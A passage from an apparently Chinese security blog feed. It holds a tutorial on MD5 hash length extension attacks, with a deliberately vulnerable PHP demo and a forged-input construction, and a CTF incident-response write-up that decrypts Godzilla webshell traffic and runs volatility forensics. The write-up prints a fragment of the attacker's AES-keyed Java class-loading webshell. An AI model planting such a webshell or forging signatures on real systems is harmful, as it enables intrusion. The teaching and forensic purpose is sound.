        <content type="html"><![CDATA[<h1 id="Hash长度拓展攻击"><a href="#Hash长度拓展攻击" class="headerlink" title="Hash长度拓展攻击"></a>Hash长度拓展攻击</h1><blockquote><p>参考：</p><p><a href="https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/">https://www.0x002.com/2020/%E6%B5%85%E8%B0%88HASH%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</a></p><p><a href="https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki=oQet6QHW4D#toc-1">https://xz.aliyun.com/t/10602?time__1311=CqjxRGiteiq05DK5YIx7Ki%3DoQet6QHW4D#toc-1</a></p><p><a href="https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80">https://ciphersaw.me/2017/11/12/hash-length-extension-attack/#0x00-%E5%89%8D%E8%A8%80</a></p></blockquote><p>hash长度拓展攻击，概括一下就是由于hash的生成机制使得我们可以人为的在原先的明文基础上添加新的拓展字符，从而使得原本的加密链变长，进一步控制加密链的最后一节，使得我们得以控制最终的结果。</p><p>这里首先给出一个相关demo：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$secretKey</span> = <span class="string">&#x27;xxxxxx&#x27;</span>; <span class="comment">#xxx为未知内容，但长度已知为6。</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line"><span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$secretKey</span>.<span class="variable">$v1</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$token</span>); <span class="comment">#token=2df51a84abc64a28740d6d2ae8cd7b16</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$token</span> === <span class="variable">$sign</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在这个例子中，我们需要使得变量<code>$token</code>与我们输入的sign参数满足一致才会输出flag。</p><p>而由于我们无法知道变量<code>$secretKey</code>的内容，所以无法得到<code>$token</code>的值，故而看似是没有办法获取到flag的死局，而这时便轮到我们的拓展攻击来大显身手了。</p><h2 id="md5算法过程"><a href="#md5算法过程" class="headerlink" title="md5算法过程"></a>md5算法过程</h2><img src="https://img.0x002.com/article/hashLengthExtensionHack/20180813125243-b731fe76-9eb4-1.png" alt="MD5加密流程" style="zoom:80%;" /><p>md5算法是512位一组的，也就是64字节一组，见下面的例子：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092231452.png" class="" title="图片引用方法一"><p>由64个a和3个b组成，这里的64个a其二进制长度为512位，已经符合一个md5分组，后面的bbb是下一个分组了。</p><blockquote><p>对于md5算法，我们需要将原始数据分块处理，以512个二进制数据为一块。”最后“一块的处理分为以下两种情况：</p><ul><li>明文数据的二进制数据长度&lt;&#x3D;448，填充padding(无意义占位)数据使其长度为448，再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li><li>448&lt;明文数据的二进制数据长度&lt;&#x3D;512，填充padding数据至下一块的448位，而后再添加原始明文数据的二进制长度信息（64位）使其长度为512位即可。</li></ul></blockquote><p><strong>情况一：</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092526249.png" class="" title="图片引用方法一"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092538591.png" class="" title="图片引用方法一"><p>这里其实64个字符a组成了一个md5分组，剩下的32个字符b作为下一个md5分组，然后需要进行填充。</p><p>进行填充的方式就是在二进制下第一个补1，后面的依次补0 。但是在这里咱们是以十六进制形式在010里演示的，而对于十六进制来说，一个十六进制字符对应4个二进制字符，所以对于010里面数据来说，10000000(2)&#x3D;&#x3D;80(16)，补充上去就是：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104092858007.png" class="" title="图片引用方法一"><p>然后后面依次补0，知道填满448位为止，得到最终补位结果为：</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104093536746.png" class="" title="图片引用方法一"><p>然后还需要补位8个字节，原始明文为64个a和32个b，共96个字符，768位，转换为十六进制就是300。</p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094147690.png" class="" title="图片引用方法一"><p><strong>情况二：</strong></p><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094227950.png" class="" title="图片引用方法一"><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104094235021.png" class="" title="图片引用方法一"><p>补位就不展示了，跟上面的情况一是同理的。</p><p>对于MD5算法来说，有一串初始向量如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>这串初始向量的值是固定的，作为与第一块数据运算的原始向量。</p><p>当这串向量与第一块数据块运算之后，得到了一串新的向量值，这串新的向量值接着与第二块数据块参加运算，直到最后一块数据块。</p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200906234219.png" alt="向量运算" style="zoom:67%;" /><p>而最后的MD5值就是这最后的向量串经过如下转换的结果。</p><p>如向量串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0xab45bc01</span><br><span class="line">B=0x6a64bb53</span><br><span class="line">C=0x23ba8afe</span><br><span class="line">D=0x46847a62</span><br></pre></td></tr></table></figure><p>再进行高低位互换，得到如下数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01 bc 45 ab</span><br><span class="line">53 bb 64 6a</span><br><span class="line">fe 8a ba 23</span><br><span class="line">62 7a 84 46</span><br></pre></td></tr></table></figure><p>最终拼接得到MD5值：<code>01bc45ab53bb646afe8aba23627a8446</code>。</p><h3 id="回首demo"><a href="#回首demo" class="headerlink" title="回首demo"></a>回首demo</h3><p>然后回到先前那个例子：</p><p>对于MD5值：<code>2df51a84abc64a28740d6d2ae8cd7b16</code>。我们可以根据MD5与向量互转规则，将MD5转成<code>md5($secretKey + &quot;test&quot;)</code>的最终向量值（A’、B’、C’、D’）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A&#x27;=0x841af52d</span><br><span class="line">B&#x27;=0x284ac6ab</span><br><span class="line">C&#x27;=0x2a6d0d74</span><br><span class="line">D&#x27;=0x167bcde8</span><br></pre></td></tr></table></figure><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907000504.png" alt="例子向量运算过程" style="zoom:80%;" /><p>这时候我们修改<code>$v1</code>变量的内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;test&quot; + [0x80 + (0x0)*45] + [0x50 + 0x0*7] + &quot;abc&quot;</span><br><span class="line">相当于:</span><br><span class="line">&quot;test&quot; + padding数据 + 长度数据 + &quot;abc&quot;</span><br></pre></td></tr></table></figure><p>则上述过程则被延续成下图所示：</p><p><img src="https://img.0x002.com/article/hashLengthExtensionHack/20200907002411.png" alt="延续运算过程"></p><p>而对于上述运算过程来说，我们知道了倒数第二个向量串的内容和最后一个数据块，这样一来，最终的MD5值我们也可以自己通过MD5算法计算出来了。</p><h2 id="利用工具exploit"><a href="#利用工具exploit" class="headerlink" title="利用工具exploit"></a>利用工具exploit</h2><h3 id="hash-ext-attack-master"><a href="#hash-ext-attack-master" class="headerlink" title="hash-ext-attack-master"></a>hash-ext-attack-master</h3><h3 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h3><img src="/2025/01/04/Hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/image-20250104095951008.png" class="" title="图片引用方法一"><h3 id="hash-extender"><a href="#hash-extender" class="headerlink" title="hash_extender"></a>hash_extender</h3><p><a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届solar应急响应-wp</title>
      <link href="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"/>
      <url>/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="第一届solar应急响应比赛-复现"><a href="#第一届solar应急响应比赛-复现" class="headerlink" title="第一届solar应急响应比赛 复现"></a>第一届solar应急响应比赛 复现</h1><h2 id="日志流量"><a href="#日志流量" class="headerlink" title="日志流量"></a>日志流量</h2><h3 id="日志流量1"><a href="#日志流量1" class="headerlink" title="日志流量1"></a>日志流量1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>web目录，存在后门？那就用d盾扫</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094659560.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094743847.png" class="" title="图片引用方法一"><p>code是base64编码，怀疑是flag，解码看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f!l^a*g&#123;A7b4_X9zK_2v8N_wL5q4&#125;</span><br></pre></td></tr></table></figure><h3 id="日志流量2"><a href="#日志流量2" class="headerlink" title="日志流量2"></a>日志流量2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>题目1是后门嘛，那么密码，加密方式等肯定在里面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String code=<span class="string">&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0=&quot;</span>; String xc=<span class="string">&quot;a2550eeab0724a69&quot;</span>; <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>&#123;<span class="built_in">super</span>(z);&#125;<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125;</span><br></pre></td></tr></table></figure><p>AES加密，密钥也给了a2550eeab0724a69</p><p>这里先看流量包。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095121947.png" class="" title="图片引用方法一"><p>不出意外这就是我们需要查看的流量了。b.jsp</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229095203297.png" class="" title="图片引用方法一"><p><strong>这里说一下如何判断哥斯拉流量特征：</strong></p><p><a href="https://feifeitan.cn/index.php/archives/280/">https://feifeitan.cn/index.php/archives/280/</a></p><p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">https://blog.csdn.net/sinat_31884905/article/details/132548617</a></p><p>具体可以看我的笔记。</p><p>这里根据Cookie值最后出现了分号可以判断它是哥斯拉流量！！</p><p>然后我们需要做的就是解密哥斯拉流量。</p><p>发现这个流量的格式是raw的，很混淆，不是标准的base64，那么我们转换到原始数据，直接用cyberchef解密即可。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102503964.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102526760.png" class="" title="图片引用方法一"><p>密钥也有了，设置一下然后再接一个Gunzip即可。</p><p>这要翻好久，终于翻到了一个flag.txt，readfile，那么flag可能就在请求包中！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102614706.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229102812837.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sA4hP_89dFh_x09tY_lL4SI4&#125;</span><br></pre></td></tr></table></figure><h3 id="日志流量3"><a href="#日志流量3" class="headerlink" title="日志流量3"></a>日志流量3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>既然是上传文件，那么data肯定是很大的，小的就不用看了，看flag下面那个，有可能就是。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103101771.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103109050.png" class="" title="图片引用方法一"><p>flag.pdf，再转变为ascii看仔细点</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103208759.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/octet-stream</span><br></pre></td></tr></table></figure><p>那应该就是上传flag.pdf文件了！接下来我们需要导出它！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103655329.png" class="" title="图片引用方法一"><p>导出为pdf文件然后解压即可。</p><p>这里有点奇怪，不应该导出为gz然后解压出pdf嘛？但是我直接导出为pdf就行了。。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229103829037.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dD7g_jk90_jnVm_aPkcs&#125;</span><br></pre></td></tr></table></figure><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">本题作为签到题,请给出邮服发件顺序。</span><br><span class="line"></span><br><span class="line">Received: from mail.da4s8gag.com ([140.143.207.229])</span><br><span class="line">by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k</span><br><span class="line">X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=</span><br><span class="line">Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;</span><br><span class="line">dkim=none; dmarc=none(permerror) header.from=solar.sec</span><br><span class="line"></span><br><span class="line">Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])</span><br><span class="line">by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)</span><br><span class="line">Date: Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">To: hellosolartest@qq.com</span><br><span class="line"></span><br><span class="line">From: 鍏嬪競缃戜俊</span><br><span class="line">Subject:xxxxxxxxxx</span><br><span class="line">Message-Id: &lt;20241017112401.032146@mail.solar.sec&gt;</span><br><span class="line">X-Mailer: QQMail 2.x</span><br><span class="line"></span><br><span class="line">XXXXXXXXXX</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;domain1|...|domainN&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-1"><a href="#内存取证-1" class="headerlink" title="内存取证-1"></a>内存取证-1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到rdp连接的跳板地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>给了一个raw文件。</p><p>内存取证直接拿出我们的volatility</p><p>要查看跳板地址，那肯定要看端口使用情况，使用netscan</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110142358.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110211801.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110242420.png" class="" title="图片引用方法一"><p>其他都是0.0.0.0的，看中间这些就行了。</p><p>filefox.exe是火狐浏览器的进程，感觉也没必要看，看svchost.exe还有个System还有个spoolsv.exe就行，都试一下。</p><p>最后试出来就是这个，其实这里也不用试，rdp嘛也就是远程桌面协议，对应3389端口，看谁连接了我们本地的3389端口即可。那就只有下面这个啦！</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110352142.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.60.220&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-2"><a href="#内存取证-2" class="headerlink" title="内存取证-2"></a>内存取证-2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者下载黑客工具的IP地址</span><br><span class="line">flag格式 flag&#123;1.1.1.1&#125;</span><br></pre></td></tr></table></figure><p>既然是下载黑客工具，那么netscan的连接肯定是可以看到的，但我们无法判断是哪个，只能一个一个试，这是一种方法。</p><p>还有一种方法，下载黑客工具，那么黑客肯定要执行命令，我们看cmdscan即可。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229110908943.png" class="" title="图片引用方法一"><p>直接看到了mimikatz，那对应的ip地址就是155.94.204.67啦！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;155.94.204.67&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-3"><a href="#内存取证-3" class="headerlink" title="内存取证-3"></a>内存取证-3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">攻击者获取的“FusionManager节点操作系统帐户（业务帐户）”的密码是什么</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111119862.png" class="" title="图片引用方法一"><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111344755.png" class="" title="图片引用方法一"><p>看cmdline看到一个pass.txt，有可能就是。同时根据命令执行的顺序，pass.txt应该在桌面上</p><p>接下来我们用filescan查看文件</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111435871.png" class="" title="图片引用方法一"><p>使用 dumpfiles 插件导出</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111637244.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007e4cedd0 -D</span><br><span class="line"> ./</span><br></pre></td></tr></table></figure><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111723222.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GalaxManager_2012&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-4"><a href="#内存取证-4" class="headerlink" title="内存取证-4"></a>内存取证-4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者创建的用户</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure><p>获取注册表中的用户即可，很简单。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229111905095.png" class="" title="图片引用方法一"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f H:\应急响应比赛\【题目】小题+综合题\solar\SERVER-2008-20241220-162057\SERVER-2008-20241220-162057.raw --profile=Win7SP1x64 printkey  -K  &quot;SAM\Domains\Account</span><br><span class="line">\Users\Names&quot;</span><br></pre></td></tr></table></figure><p>直接试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ASP.NET&#125;</span><br></pre></td></tr></table></figure><h3 id="内存取证-5"><a href="#内存取证-5" class="headerlink" title="内存取证-5"></a>内存取证-5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目文件：SERVER-2008-20241220-162057</span><br><span class="line">请找到攻击者利用跳板rdp登录的时间</span><br><span class="line">flag格式 flag&#123;2024/01/01 00:00:00&#125;</span><br></pre></td></tr></table></figure><p><strong>方法一：</strong></p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112051539.png" class="" title="图片引用方法一"><p>可以找到进程1908，但是这里没有时间。</p><p>那么接下来我们看看进程。</p><img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229112208817.png" class="" title="图片引用方法一"><p><strong>PID（Process ID）</strong></p><ul><li><strong>定义</strong>：PID 是操作系统分配给每个运行中进程的唯一标识符。每个进程在系统中都有一个唯一的 PID，用于标识进程。</li><li><strong>作用</strong>：PID 用于区分不同的进程，是系统内核跟踪和管理进程的重要方式。每当一个新的进程被创建时，操作系统会为其分配一个唯一的 PID。</li><li><strong>示例</strong>：如果你通过命令（如 <code>ps</code> 或 <code>top</code>）查看进程列表，你会看到每个进程对应的 PID。比如，PID 为 1234 的进程可能是一个正在运行的程序。</li></ul><p><strong>PPID（Parent Process ID）</strong></p><ul><li><strong>定义</strong>：PPID 是一个进程的父进程的 PID。换句话说，PPID 指的是启动当前进程的进程的标识符。每个进程（除了初始化进程）都有一个父进程。</li><li><strong>作用</strong>：PPID 